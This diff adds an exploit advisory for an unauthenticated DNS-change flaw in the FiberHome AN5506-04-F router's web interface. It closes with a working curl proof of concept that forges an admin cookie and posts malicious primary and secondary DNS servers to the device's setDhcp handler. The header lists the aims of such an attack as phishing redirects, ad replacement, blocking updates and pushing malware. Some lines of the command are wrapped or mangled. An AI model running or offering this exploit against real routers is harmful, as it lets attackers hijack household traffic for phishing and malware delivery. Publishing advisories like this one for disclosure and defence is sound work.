@@ -1,0 +1,54 @@
+#  FIBERHOME AN5506 Unauthenticated Remote DNS Change Vulnerability
+#
+#  Software Version RP2617
+#  Device Model AN5506-04-F
+#  Vendor Homepage: www.fiberhome.com/
+#
+#
+#  Date: 01/02/2018
+#  Exploit Author: r0ots3c
+#  http://wandoelmo.com.br
+#  https://www.facebook.com/wsec.info
+#
+#  Description:
+#  Vulnerability exists in web interface
+#  This router has vulnerabilities where you can get information or edit
+configurations in an unauthenticated way.
+#  The biggest risk is the possibility of changing the dns of the device.
+#
+#  Modifying systems' DNS settings allows cybercriminals to
+#  perform malicious activities like:
+#
+#    o  Steering unknowing users to bad sites:
+#       These sites can be phishing pages that
+#       spoof well-known sites in order to
+#       trick users into handing out sensitive
+#       information.
+#
+#    o  Replacing ads on legitimate sites:
+#       Visiting certain sites can serve users
+#       with infected systems a different set
+#       of ads from those whose systems are
+#       not infected.
+#
+#    o  Controlling and redirecting network traffic:
+#       Users of infected systems may not be granted
+#       access to download important OS and software
+#       updates from vendors like Microsoft and from
+#       their respective security vendors.
+#
+#    o  Pushing additional malware:
+#       Infected systems are more prone to other
+#       malware infections (e.g., FAKEAV infection).
+#
+#
+
+Proof of Concept:
+
+VIA CURL:
+curl 'http://<TARGET>/goform/setDhcp'  -H 'Cookie: loginName=admin' -H
+--data
+'dhcpType=1&dhcprelay_ip=&dhcpStart=192.168.1.2&dhcpEnd=192.168.1.254&dhcpMask=255.255.255.0&dhcpPriDns=<MALICIOUS
+DNS1>dhcpSecDns=<MALICIOUS
+DNS2>&dhcpGateway=192.168.1.1&dhcptime=24&dhcptime_m=0&option_60enable_s=0&option_125enable_s=0&option125_text='
+--compressed -k -i
